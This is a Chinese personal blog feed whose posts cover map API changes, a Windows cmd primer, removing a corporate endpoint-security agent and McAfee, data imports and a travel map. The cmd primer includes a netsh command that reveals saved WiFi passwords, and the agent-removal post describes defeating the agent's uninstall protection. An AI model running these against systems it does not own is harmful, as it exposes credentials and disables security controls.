<h3 id="高德地图接口调整"><a href="#高德地图接口调整" class="headerlink" title="高德地图接口调整"></a>高德地图接口调整</h3><p>高德地图行政区域查询报错了，原因是重复的区名不能用上一级加区名来查询了。比如普陀区，有“上海市普陀区”，“舟山市普陀区”，现在查询都是没有返回结果的，只有查询“普陀区”才返回上海市普陀区。提了下工单，给的结论就是建议使用行政区域代码来查询。于是在原来数据的基础上，加个一个高德地图专用的变量，用行政区域代码来代替原来的中文。<br><img src="/img/20241128/2.png" alt><br>高德地图从2024年7月15日起，对于个人认证开发者、已购买商用服务的企业认证开发者以及列入“乘风计划”的企业认证开发者，我们将每月提供一定价值的使用配额以供使用基础服务，基础服务具体内容及配额详见产品定价。能看见自己使用的费用了，因为个人用，很难能超过上限，不过QPS貌似变少了，导致我无法显示出所有要查询的行政区域。于是只能降低QPS了，改写了原来的方法，通过setTimeout设置了400ms的延迟。虽然不能同时显示出来，但慢慢的会在页面上显现出来。<br><img src="/img/20241128/3.png" alt></p>
<h3 id="百度地图接口调整"><a href="#百度地图接口调整" class="headerlink" title="百度地图接口调整"></a>百度地图接口调整</h3><p>百度JavaScript API调用的服务额度将于2023年3月15日进行调整，其中个人认证，JS地点检索的日配额变为100，基本用用就超，QPS为30，还好。访问几次足迹，下图就成为常态。<br><img src="/img/20241128/4.png" alt><br>但是新版的GL，行政区域查询不会记录在JS地点检索中。不过有一个小插曲，就是查杭州市“西湖区”的时候直接变成了武汉市“东西湖区”……而且还不改……<br><img src="/img/20241128/5.png" alt></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其他也修改了很多，改了不少。像hexo的主题后续更新，因为自己改过源代码，只能手动更改，比如检索功能，很早之前加的了。11月最近自己的时间变多了，对博客的修改也变多了。<br><img src="/img/20241128/6.png" alt><br>人无千日好，花无百日红。写博客纯粹是个人兴趣，不知道能坚持多久。不过域名已经又买了3年（价格越来越贵），再坚持几年应该没有太大问题。</p>
]]></content>
      <tags>
        <tag>博客</tag>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows命令提示符（cmd）入门与常用命令</title>
    <url>/2025/01/02/Windows%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%EF%BC%88cmd%EF%BC%89%E5%85%A5%E9%97%A8%E4%B8%8E%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p><em>很早就想整理一下cmd命令了，但是一直拖着，虽然平时用的只有那么几个。用过微机的同学应该知道，以前是没有鼠标，输入完全靠键盘，那时应该是DOS系统吧，有些图形用户界面。<br>欲买桂花同载酒，终不似，少年游。</em></p>
<p>先贴一下官方文档<a href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands" target="_blank" rel="noopener">Windows 命令</a>，应该是所有的命令了吧。</p>
<h4 id="命令行语法的表示法："><a href="#命令行语法的表示法：" class="headerlink" title="命令行语法的表示法："></a>命令行语法的表示法：</h4><table>
<thead>
<tr>
<th align="center">表示法</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">不含方括号或大括号的文本</td>
<td align="center">必须按所显示键入的项。</td>
</tr>
<tr>
<td align="center">&lt;Text inside angle brackets&gt;</td>
<td align="center">必须为其提供值的占位符。</td>
</tr>
<tr>
<td align="center">[Text inside square brackets]</td>
<td align="center">可选项。</td>
</tr>
<tr>
<td align="center">{Text inside braces}</td>
<td align="center">一组必需的项。 你必须选择一个。</td>
</tr>
<tr>
<td align="center">竖线 (|)</td>
<td align="center">互斥项的分隔符。 你必须选择一个。</td>
</tr>
<tr>
<td align="center">省略号 (…)</td>
<td align="center">可重复使用多次的项。</td>
</tr>
</tbody></table>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>我通常使用<code>win+r</code>打开运行，输入<code>cmd</code>回车打开。要想以管理员身份运行可以按Win键输入<code>cmd</code>然后在命令提示符上右键以管理员权限运行<br><img src="/img/20250102/1.png" alt><br>如果想定位到某个文件夹，可以直接在对应文件夹的地址栏中输入<code>cmd</code>回车（不能有同名文件夹，有的话，会打开对应的文件夹，并且文件夹锁定，无法进行重命名），想以管理员身份运行的话只能自己打地址了。<br><img src="/img/20250102/2.png" alt></p>
<h4 id="HELP-提供-Windows-命令的帮助信息"><a href="#HELP-提供-Windows-命令的帮助信息" class="headerlink" title="HELP 提供 Windows 命令的帮助信息"></a>HELP 提供 Windows 命令的帮助信息</h4><p>单独使用可以显示部分命令<br><img src="/img/20250102/3.png" alt><br>后面跟命令可以显示该命令的帮助信息，可以通过<code>[command] /?</code>实现同样的效果<br><img src="/img/20250102/4.png" alt><br>以下列出命令可以使用help来查看帮助信息</p>
<h4 id="快速访问"><a href="#快速访问" class="headerlink" title="快速访问"></a>快速访问</h4><p>cmd可以和<code>win+r</code>运行一样，可以直接打开对应的程序，不过用运行更快。<br><img src="/img/20250102/5.png" alt></p>
<p>这里列一些能打开的程序</p>
<ul>
<li>winver windows版本信息</li>
<li>mstsct 远程桌面连结</li>
<li>explorer 文件资源管理器</li>
<li>control folders 文件夹选项</li>
<li>control printers 打印机和扫描仪设置</li>
<li>notepad 记事本</li>
<li>calc 计算器</li>
<li>mspaint 画图</li>
<li>write 写字板</li>
<li>osk 屏幕键盘</li>
<li>magnify 放大镜</li>
<li>narrator 讲述人</li>
<li>msconfig 系统配置</li>
<li>compmgmt.msc 计算机管理</li>
<li>diskmgmt.msc 磁盘管理</li>
<li>devmgmt.msc 设备管理器</li>
<li>services.msc 服务管理</li>
<li>lusrmgr.msc 本机用户和组管理</li>
<li>perfmon.msc 性能监视器</li>
<li>secpol.msc 本地安全策略</li>
<li>certmgr.msc 证书管理</li>
<li>fsmgmt.msc 共享文件夹管理器</li>
<li>rsop.msc 组策略结果集</li>
<li>taskmgr 任务管理器</li>
<li>gpedit 组策略编辑器</li>
<li>cleanmgr 磁盘清理</li>
<li>regedit 注册表编辑器</li>
<li>eventvwr 事件查看器</li>
<li>wscript Windows脚本宿主设置</li>
<li>charmap 字符映射表</li>
<li>dcomcnfg 组件服务</li>
<li>dxdiag DirectX诊断工具</li>
<li>eudcedit 造字程序</li>
<li>iexpress 创建自解压缩的可执行文件exe</li>
<li>mmc 控制台</li>
<li>sigverif 文件签名验证</li>
</ul>
<h4 id="cd-显示当前目录和改变目录"><a href="#cd-显示当前目录和改变目录" class="headerlink" title="cd 显示当前目录和改变目录"></a>cd 显示当前目录和改变目录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">跳转到根目录</span><br><span class="line">cd \</span><br><span class="line"></span><br><span class="line">跳转到下级目录</span><br><span class="line">cd Users\xuchl</span><br><span class="line">cd desktop</span><br><span class="line"></span><br><span class="line">回到上级目录</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">跳转到指定目录</span><br><span class="line">cd C:\Users\xuchl\Desktop</span><br><span class="line"></span><br><span class="line">跳转到D盘</span><br><span class="line">d:</span><br><span class="line">跳回C盘桌面(加参数d可以直接跳回)</span><br><span class="line">D:\&gt;cd C:\Users\xuchl\Desktop</span><br><span class="line">D:\&gt;c:</span><br><span class="line">C:\Users\xuchl\Desktop&gt;</span><br><span class="line"></span><br><span class="line">D:\&gt;cd /d C:\Users\xuchl\Desktop</span><br><span class="line">C:\Users\xuchl\Desktop&gt;</span><br></pre></td></tr></table></figure>

<h4 id="dir-显示目录中的文件和子目录列表"><a href="#dir-显示目录中的文件和子目录列表" class="headerlink" title="dir 显示目录中的文件和子目录列表"></a>dir 显示目录中的文件和子目录列表</h4><h4 id="md-创建目录"><a href="#md-创建目录" class="headerlink" title="md 创建目录"></a>md 创建目录</h4><h4 id="rd-删除目录（永久删除）"><a href="#rd-删除目录（永久删除）" class="headerlink" title="rd 删除目录（永久删除）"></a>rd 删除目录（永久删除）</h4><h4 id="copy-将一份或多份文件复制到另一个位置"><a href="#copy-将一份或多份文件复制到另一个位置" class="headerlink" title="copy 将一份或多份文件复制到另一个位置"></a>copy 将一份或多份文件复制到另一个位置</h4><h4 id="move-移动文件并重命名文件和目录"><a href="#move-移动文件并重命名文件和目录" class="headerlink" title="move 移动文件并重命名文件和目录"></a>move 移动文件并重命名文件和目录</h4><h4 id="del-删除一个或多个文件"><a href="#del-删除一个或多个文件" class="headerlink" title="del 删除一个或多个文件"></a>del 删除一个或多个文件</h4><h4 id="type-显示文本文件的内容"><a href="#type-显示文本文件的内容" class="headerlink" title="type 显示文本文件的内容"></a>type 显示文本文件的内容</h4><h4 id="color-设置默认的控制台前景和背景颜色"><a href="#color-设置默认的控制台前景和背景颜色" class="headerlink" title="color 设置默认的控制台前景和背景颜色"></a>color 设置默认的控制台前景和背景颜色</h4><p>个人喜欢0a（背景黑色，文字淡绿色），写批处理的时候基本用这个</p>
<h4 id="cls-清除屏幕"><a href="#cls-清除屏幕" class="headerlink" title="cls 清除屏幕"></a>cls 清除屏幕</h4><h4 id="find-在文件中搜索字符串-必须加双引号"><a href="#find-在文件中搜索字符串-必须加双引号" class="headerlink" title="find 在文件中搜索字符串 必须加双引号"></a>find 在文件中搜索字符串 必须加双引号</h4><h4 id="findstr-在文件中寻找字符串"><a href="#findstr-在文件中寻找字符串" class="headerlink" title="findstr 在文件中寻找字符串"></a>findstr 在文件中寻找字符串</h4><h4 id="tasklist-显示在本地或远程机器上当前运行的进程列表"><a href="#tasklist-显示在本地或远程机器上当前运行的进程列表" class="headerlink" title="tasklist 显示在本地或远程机器上当前运行的进程列表"></a>tasklist 显示在本地或远程机器上当前运行的进程列表</h4><h4 id="taskkill-按照进程-ID-PID-或映像名称终止任务"><a href="#taskkill-按照进程-ID-PID-或映像名称终止任务" class="headerlink" title="taskkill 按照进程 ID (PID) 或映像名称终止任务"></a>taskkill 按照进程 ID (PID) 或映像名称终止任务</h4><p>tasklist一般配合查找命令findstr使用来限定返回结果<br><img src="/img/20250102/6.png" alt></p>
<h4 id="ping-用来测试网络是否畅通"><a href="#ping-用来测试网络是否畅通" class="headerlink" title="ping 用来测试网络是否畅通"></a>ping 用来测试网络是否畅通</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认进行4次ping操做</span><br><span class="line">ping baidu.com</span><br><span class="line">ping 39.156.66.10</span><br><span class="line"></span><br><span class="line">进行10次ping操做</span><br><span class="line">ping 39.156.66.10 -n 10</span><br><span class="line"></span><br><span class="line">一直ping，直到手动停止（ctrl+c键）</span><br><span class="line">ping 39.156.66.10 -t</span><br></pre></td></tr></table></figure>

<h4 id="tracert-路由跟踪-用于确定访问目标时所选择的路径"><a href="#tracert-路由跟踪-用于确定访问目标时所选择的路径" class="headerlink" title="tracert 路由跟踪 用于确定访问目标时所选择的路径"></a>tracert 路由跟踪 用于确定访问目标时所选择的路径</h4><h4 id="ipconfig-查看本机ip信息"><a href="#ipconfig-查看本机ip信息" class="headerlink" title="ipconfig 查看本机ip信息"></a>ipconfig 查看本机ip信息</h4><h4 id="netstat-显示协议统计信息和当前-TCP-IP-网络连接"><a href="#netstat-显示协议统计信息和当前-TCP-IP-网络连接" class="headerlink" title="netstat 显示协议统计信息和当前 TCP/IP 网络连接"></a>netstat 显示协议统计信息和当前 TCP/IP 网络连接</h4><h4 id="netsh-显示或修改当前正在运行的计算机的网络配置"><a href="#netsh-显示或修改当前正在运行的计算机的网络配置" class="headerlink" title="netsh 显示或修改当前正在运行的计算机的网络配置"></a>netsh 显示或修改当前正在运行的计算机的网络配置</h4><p>曾经使用过的WiFi连接<br><code>netsh wlan show profiles</code><br>查询某个WiFi密码<br><code>netsh wlan show profile name=&quot;连接名&quot; key=clear</code></p>
<h4 id="certutil-证书服务的一部分安装的命令行工具"><a href="#certutil-证书服务的一部分安装的命令行工具" class="headerlink" title="certutil 证书服务的一部分安装的命令行工具"></a>certutil 证书服务的一部分安装的命令行工具</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件校验 默认输出sha1，用于对比</span><br><span class="line">certutil -hashfile 文件名1</span><br><span class="line">certutil -hashfile 文件名2</span><br></pre></td></tr></table></figure>

<h4 id="windows标识查询"><a href="#windows标识查询" class="headerlink" title="windows标识查询"></a>windows标识查询</h4><p>获取CPUID (非唯一)<br><code>wmic cpu get processorid</code><br>获取主板唯一识别码 (推荐)<br><code>wmic csproduct get uuid</code><br>获取硬盘序列号<br><code>wmic diskdrive get serialnumber</code><br>获取主板序列号<br><code>wmic baseboard get serialnumber</code><br>获取BIOS序列号 (电脑的序列号)<br><code>wmic bios get serialnumber</code><br>从注册表获取MachineGuid (系统安装过程中生成)<br><code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid</code><br>获取MAC地址<br><code>getmac</code></p>
<h4 id="慎用命令"><a href="#慎用命令" class="headerlink" title="慎用命令"></a>慎用命令</h4><ul>
<li>logoff 注销</li>
<li>shutdown 关机</li>
</ul>
<h4 id="gt-新建-覆盖文件"><a href="#gt-新建-覆盖文件" class="headerlink" title="&gt; 新建/覆盖文件"></a>&gt; 新建/覆盖文件</h4><h4 id="gt-gt-写入文件末尾"><a href="#gt-gt-写入文件末尾" class="headerlink" title="&gt;&gt; 写入文件末尾"></a>&gt;&gt; 写入文件末尾</h4><p>个人很喜欢用<code>tree</code>来生成文件树，如果用&gt;写入文件会包含写入文件本身。<br><img src="/img/20250102/7.png" alt></p>
<h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><ul>
<li>终止运行命令 <code>ctrl+c</code>键</li>
<li>重复历史命令 方向上键<code>↑</code>，可重复按</li>
<li>文件名补全 <code>tab</code>键，可重复按</li>
</ul>
]]></content>
      <tags>
        <tag>windows</tag>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>不吐不快-记录ASM小助手卸载过程</title>
    <url>/2020/12/09/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E8%AE%B0%E5%BD%95ASM%E5%B0%8F%E5%8A%A9%E6%89%8B%E5%8D%B8%E8%BD%BD%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="不吐不快-记录ASM小助手卸载过程"><a href="#不吐不快-记录ASM小助手卸载过程" class="headerlink" title="不吐不快-记录ASM小助手卸载过程"></a>不吐不快-记录ASM小助手卸载过程</h2><p><em>吐槽专用，图片是卸载的时候弄的，不是很全</em></p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>因为去别人的公司出差，需要通过公司Wifi来连接互联网（本来一般都是用自己手机热点的，现在就是后悔，非常后悔），连接上Wifi后输入申请的账号，然后需要下载一个插件来做安全检查。这个插件需要管理员权限来运行，也就是今天的主角-ASM小助手，当时没把它当回事。后来回到自己公司，通过git提交代码时候超时，GitHub无法访问，然后寻找原因就发现了它的存在。</p>
<div align="center"><img src="/img/20201209/1.png"></div>

<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>这个插件貌似以前朋友提到过，说无法卸载，大概说的就是这个。网上很多用360文件粉碎的，想了想还要装360就算了吧。<br>刚开始打开win10的应用和功能，发现列表里根本没有这个软件……然后从任务栏图标打开程序选择卸载却发现一点反应没有。通过任务管理器找到软件安装位置，然后惊了，居然装在<code>Windows/SysWOW64</code>下面，<code>System32</code>下居然也有，这可以系统文件夹啊。安装的时候啥也没提示，直接让你用管理员权限安装。经过研究，发现安装和卸载使用的同一个可执行文件IsaSetup.exe，只是传递不同的参数而已。以管理员权限运行命令提示符，通过<code>IsaSetup.exe -Remove</code>来执行卸载，结果需要输入验证码……大概需要通过内部服务器进行申请，也就是说对于脱离了他们公司内网的情况下，要获取验证码是不可能的。<br><img src="/img/20201209/2.png" alt></p>
<p>然后转换思路，开始进行物理删除。刚开始在任务管理器的用户标签页发现结束进程后，会自己重新启动。刚开始以为是有别的进程唤醒，其实不是，需要在进程标签页结束进程才能彻底结束。因为涉及到系统文件夹，删除要格外小心，我根据名字和时间排序，基本定位了所有文件，但是有部分文件无法删除，还是有进程在占用着。</p>
<p>在任务管理器的程序标签页显示命令行信息，但是没有找到类似的路径信息。然后打开注册表全局搜索安装目录IsAgent，然后找到了关键信息，原来还有一个服务没有干掉。因为调用的系统镜像加上服务被折叠而没有发现。<br><img src="/img/20201209/3.png" alt><br><img src="/img/20201209/4.png" alt></p>
<p>然后结束服务，并把注册表里的条目删除，后发现还有一个文件不能被删除，提示我没有管理员权限……</p>
<div align="center"><img src="/img/20201209/5.png"></div>

<p>打开文件属性，发现安全标签页无法查看，就是没有权限呗。然后打开高级选项把文件所有者改为当前用户，这样还是删除不掉，还需要把显示出来的权限所有拒绝权限条目删除。<br><img src="/img/20201209/6.png" alt></p>
<p>至此，所有文件都进入回收站了，然后右键清空。<br><img src="/img/20201209/7.png" alt></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>上次这么搞还是Office365的弹出广告来着，不过那个和这个比起来友好多了。</p>
]]></content>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>不吐不快-记录一次修电脑（卸载迈克菲）</title>
    <url>/2023/09/22/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BF%AE%E7%94%B5%E8%84%91%EF%BC%88%E5%8D%B8%E8%BD%BD%E8%BF%88%E5%85%8B%E8%8F%B2%EF%BC%89/</url>
    <content><![CDATA[<h2 id="不吐不快-记录一次修电脑（卸载迈克菲）"><a href="#不吐不快-记录一次修电脑（卸载迈克菲）" class="headerlink" title="不吐不快-记录一次修电脑（卸载迈克菲）"></a>不吐不快-记录一次修电脑（卸载迈克菲）</h2><p><em>吐槽专用，没啥干货，记录的图片也不是很全</em></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>隔三差五就给家人们解决电脑问题，最常见的就是电脑无法启动，卡啥的，偶尔自费买个交换机加加上网设备……基本上每次都不是很顺利，还找不到根本原因，比如开票用的机器开机一段时间后就无法链接开票服务器……这次起因是因为电脑能打开却卡在登录界面，事件开头为一次微信聊天：</p>
<div align="center"><img src="/img/20230922/1.jpg"></div>
然后当天下午就去现场解决问题了

<h2 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h2><p>查看电脑发现，每次基本都会在登录界面卡住，但是鼠标能操做，键盘指示灯正常切换，键盘输入延迟很高，机箱很烫。初步感觉是软件方面出现问题，于是想试试安全模式是否能正常进入。这里得吐槽下Win11，安全模式除了进入系统里按Shift键+开始菜单“重新启动”和通过设置应用程序进入（过程较长，不说了）外，开机基本没法通过快捷键进入，于是只能强制关机两次……</p>
<blockquote>
<p>对于Win7及更早版本，可以通常在打开PC后按功能键（例如 F8）来启动安全模式，从Win8开始删除了此功能，因为新技术的出现，启动时间变得太快，以至于有人无法在Windows加载之前及时按下F8。于是设计了一种“自动故障转移”解决方法，用于PC发生故障且Windows法正常加载时。如果连续两次无法启动，将自动进入高级启动故障排除模式。</p>
</blockquote>
<p>然后发现安全模式能够正常进入，基本确定是最近新增的软件的问题。于是进应用列表，发现当天有安装新的迈克菲以及一些其他软件，介于Win11自带杀毒软件以及有联想电脑管家，对，又是联想电脑。尝试卸载新装的迈克菲，结果卸载的过程出错，提示忘了是啥了，一个弹出框貌似是提示【卸载过程出错】（这里没拍），安全模式下没法通过应用卸载。在安全模式禁用了大部分没啥用的启动项，貌似包含迈克菲的相关程序。</p>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>以正常模式进入电脑，依旧卡……突发奇想，把网络断了，终于在卡顿中进入了系统。然后打开任务管理器，发现一个McAfee Framework Host Service进程CPU占用巨高，基本就是病症所在了。但是无法结束进程，提示拒绝访问。正常模式进入系统的应用能删除新装的迈克菲，但是卸载程序本身报错。<br><img src="/img/20230922/2.png" alt><br>但是对应的服务根本没有启动，但是有进程，呵呵<br><img src="/img/20230922/3.png" alt><br>另一个迈克菲程序卸载一直卡在程序正在运行，但是迈克菲软件从头到尾也没有找到退出按钮（貌似可以终止进程，这里没有尝试）……<br><img src="/img/20230922/4.png" alt><br><img src="/img/20230922/5.png" alt><br>因为店里已经下班，加上家人们还在等着，就匆匆强制关掉电脑，把主机和显示器（因为家里没有VGA口的显示器也没有转接线……）抱回家自己搞</p>
<h2 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h2><p>拿出第一次淘宝购物的古董键盘，在搞个残废USB鼠标，然后继续搞。<br><img src="/img/20230922/6.png" alt><br>这次启动发现，CPU高占用的进程没了，而且第一个迈克菲卸载很顺利的完成了，原因未知，不过能卸载就好。<br><img src="/img/20230922/7.png" alt><br>但是第二个迈克菲发现无法卸载了，没有能选择的卸载程序了（如果连网会显示一张图片，选择删除的内容文字描述没了）<br><img src="/img/20230922/8.png" alt><br>不慌，上终极工具-McAfee专用卸载工具<a href="http://download.mcafee.com/products/licensed/cust_support_patches/MCPR.exe" target="_blank" rel="noopener"><code>MCPR.exe</code></a>，还是McAfee官网的工具好用，完美卸载<br><img src="/img/20230922/9.png" alt></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>联想电脑自带的迈克菲（联想杀毒plus），没有找到任何退出按钮，正常无法通过应用卸载。设置里更新无法关闭，和Windows一样，只能做到更新并通知的程度，无法关闭。默认空闲时杀毒，对不太懂电脑的人不太友好。不过第一次出现这种情况，估计新更新安全迈克菲的锅，为了彻底杜绝，就把所有迈克菲都卸载了，反正还有个联想的电脑管家，个人还是喜欢Win10，Win11自带的。</p>
]]></content>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>不吐不快-记录一次千万级数据统计</title>
    <url>/2020/06/04/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%8D%83%E4%B8%87%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%9F%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="不吐不快-记录一次千万级数据统计"><a href="#不吐不快-记录一次千万级数据统计" class="headerlink" title="不吐不快-记录一次千万级数据统计"></a>不吐不快-记录一次千万级数据统计</h2><p><em>吐槽专用，没啥干货</em></p>
<h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>甲方发来了两个压缩包，一个Google的，一个IOS的游戏充值数据。因为数据量较大，超出了Excel的处理范围，只好让我们来处理分析。Google里面原始数据有10G，还有他们自己拆分的csv文件（Excel超过1048576行后无法完全加载文件），这也为以后的操作埋下了雷。IOS的很小，txt文本文件，合计15M，但是后期计算却花费了不少时间。<br>Google字段：<code>Description</code>,<code>Transaction Date</code>,<code>Transaction Time</code>,<code>Tax Type</code>,<code>Transaction Type</code>,<code>Refund Type</code>,<code>Product Title</code>,<code>Product id</code>,<code>Product Type</code>,<code>Sku Id</code>,<code>Hardware</code>,<code>Buyer Country</code>,<code>Buyer State</code>,<code>Buyer Postal Code</code>,<code>Buyer Currency</code>,<code>Amount (Buyer Currency)</code>,<code>Currency Conversion Rate</code>,<code>Merchant Currency</code>,<code>Amount (Merchant Currency)</code><br>IOS字段：<code>Start Date</code>,<code>End Date</code>,<code>UPC</code>,<code>ISRC/ISBN</code>,<code>Vendor Identifier</code>,<code>Quantity</code>,<code>Partner Share</code>,<code>Extended Partner Share</code>,<code>Partner Share Currency</code>,<code>Sales or Return</code>,<code>Apple Identifier</code>,<code>Artist/Show/Developer/Author</code>,<code>Title</code>,<code>Label/Studio/Network/Developer/Publisher</code>,<code>Grid</code>,<code>Product Type Identifier</code>,<code>ISAN/Other Identifier</code>,<code>Country Of Sale</code>,<code>Pre-order Flag</code>,<code>Promo Code</code>,<code>Customer Price</code>,<code>Customer Currency</code></p>
<h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><ol>
<li><p>首先对Google的一个渠道数据进行处理，先用了他们给的拆分数据，根据月份划分文件夹，每个文件夹里有3个csv文件。通过批处理复制到同一目录下，通过<code>copy *.csv all.csv</code>来合并为一个csv文件。因为之前的数据分析用的SQLServer数据库，效率比较好，一亿多的数据量秒级导入。但是这次就不行了，ManagementStudio的导入无法识别csv文件，通过平面文件源只能以<code>,</code>号来分割。但是因为有107格式的英文日期<code>Jan 1, 2019</code>，导致列错位。另外字段<code>Buyer State</code>是按照当地语言的，乱码导致无法通过验证。尝试了很久无果，就用Navicate导入，但是速度很慢。<br>第一次导入1800万数据，用时接近3小时，传输速率在7Mbps左右。<br><img src="/img/20200604/1.png" alt><br>然后根据月份分组查看，发现缺少2月份的数据（11月份拆分数据异常，只有1k，未导入）。然后用<code>certutil -hashfile filename MD5</code>复查数据，发现拆分好的数据1月和2月居然是一样的（想打人），压缩包的CRC32也是一样的。<br><img src="/img/20200604/2.png" alt><br>无奈和甲方沟通，让使用原始数据……然后又导入一遍，1900万数据，用时3个多小时，弄到公司只剩我一个人。<br><img src="/img/20200604/3.png" alt></p>
</li>
<li><p>第二天对另外一个渠道进行处理，这次鉴于前面的情况，直接用原始数据。然而二月份的压缩包居然是坏的（被他们玩坏了吧），经过沟通让使用他们拆分好的文件。这次按照季度汇总，分了四个表，四倍速导入。千兆带宽还是很给力的。<br><img src="/img/20200604/4.png" alt><br>导入3000多万数据，一个半小时，传输速率在30Mbps左右。<br><img src="/img/20200604/5.png" alt><br>然后计算的时候又暴雷了（哎）。经排查2月份部分数据因为拆分出的字段<code>Buyer State</code>乱码，导致后面的字段全部向前偏移。因为要用到后面的字段就通过update语句修改了数据。然而把字段位置修正，然而格式转换的时候还是报错，看数据没啥问题，复制粘贴出来，感觉多出一个换号符，然后通过Len发现确实多了一个长度，通过replace替换CHAR(13)后转换正常。</p>
</li>
<li><p>又过了一天，最后对IOS的数据处理，以为很快，然而也是个坑。就14万数据，导入很快，没啥问题，就是计算的时候来回沟通了好几次。Google是每条都计算好的，IOS不是，没有汇率，只有客户的货币。不是很清楚游戏划分种类，根据字段<code>Vendor Identifier</code>（和<code>Apple Identifier</code>一一对应）来划分，有1170种……再按月份，货币划分，最后统计出9万数据。显然这个不行，后来的想法是根据新提供过来的每月汇率来来计算出人民币。没有汇率的货币就远远本本表示，最后各整理出8千和9千的数据。不知道以后还会提出啥要求。以防万一，SQL都保存了，因为写的比较复杂。</p>
</li>
</ol>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>还好是按工作量算钱的，不过甲方就是甲方。<br>能看完的都是勇士（手动滑稽）。</p>
]]></content>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>做成我的足迹</title>
    <url>/2019/11/21/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9/</url>
    <content><![CDATA[<h1 id="做成我的足迹"><a href="#做成我的足迹" class="headerlink" title="做成我的足迹"></a>做成我的足迹</h1><p><em>光阴荏苒，日月如梭，往事随风，飘散而过。</em></p>
<p>在如何完善博客的想法下，足迹诞生了。最近一直在弄这个，以致于废寝忘食。其实最费时间的是数据部分，手机坏过换过，数据丢失了很多，备份不是很完整。</p>
<h4 id="选择工具"><a href="#选择工具" class="headerlink" title="选择工具"></a>选择工具</h4><ul>
<li><p>谷歌地图：首选，但是国内用不了，Pass</p>
</li>
<li><p>高德地图：备选，但是看了web版的日本地图，Pass（安卓比web强，IOS就是完整的，呵呵）</p>
</li>
<li><p>百度地图：最终，还是选择了百度，国外的地图还可以参考（当然需要和当地的地图结合来看，比如日本的话对照雅虎）</p>
</li>
<li><p>必应地图：论外，文档读起来有难度</p>
</li>
<li><p>雅虎地图：论外，文档读起来有难度</p>
</li>
</ul>
<h4 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h4><p>国内可以添加行政区划，国外因为没有数据只能加点(marker)</p>
<h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>发现实现很简单，但是数据的添加比较麻烦。<br>刚开始只是根据自己的记忆来从官方的<a href="http://lbsyun.baidu.com/jsdemo.htm#h0_4" target="_blank" rel="noopener">地图点击事件demo</a>（加了一句缩放代码）上获取经纬度数据。没错，一个一个点的点，然后复制……通过数组，一个个push进去，循环生成marker点，第一版做成。和朋友演示，告诉他实现方法。回了一句【弄个json数据文件，然后自动添加吧】，我以娱乐用回绝。<br>　<br>第二天，朋友给我看了他的足迹（完虐我，知道了飞地的概念）。<br>　<br>两天后，朋友发我【把我的足迹的实现方式改了改】，加了一个信息窗口（InfoWindow），可以写注释，加自己博客文章的链接等等。而且从数据库读取的json。【不过所有去过的点要一个个加，感觉心好累】，经过讨论，然后我痛定思痛，要写个工具来生成json。把数组改成json格式，修改代码逻辑，第二版完成。然后写json工具发现百度demo在线能跑，本地报错，然后通过自己的方法解决。最后json获取工具初版完成，是这个样子的<br><img src="/img/20191121/1.png" alt>通过点击来添加点，点上右键删除，alert经纬度和标签。然而朋友【这个不错，怎么保存出来】，然后讨论了生成问题。最后我决定生成在textarea中，自己复制粘贴。然后第二版的样子如下<br><img src="/img/20191121/2.png" alt>后来根据朋友的信息窗口，修改了json格式。<br>　<br>第四天（周六）,格式和朋友对齐，工具输出优化，展示页面逻辑优化。<br>　<br>周三，添加了获取图片EXIF信息的功能，有GPS信息，会直接在地图上标记。<br><img src="/img/20191121/3.png" alt><br>周四（今天），添加了地点检索功能（需要手动点击选点），至此完结，以后估计不会加新功能了。<br>点基本不会动了，有新去的地方会再加。另外放出<a href="https://xuchunlei.top/baidumapGetPoint" target="_blank">工具页面</a>和<a href="https://xuchunlei.top/myTrails" target="_blank">展示页面</a>，都是静态页面，请自行取用（百度地图的key需要更换）。<br><img src="/img/20191121/4.png" alt></p>
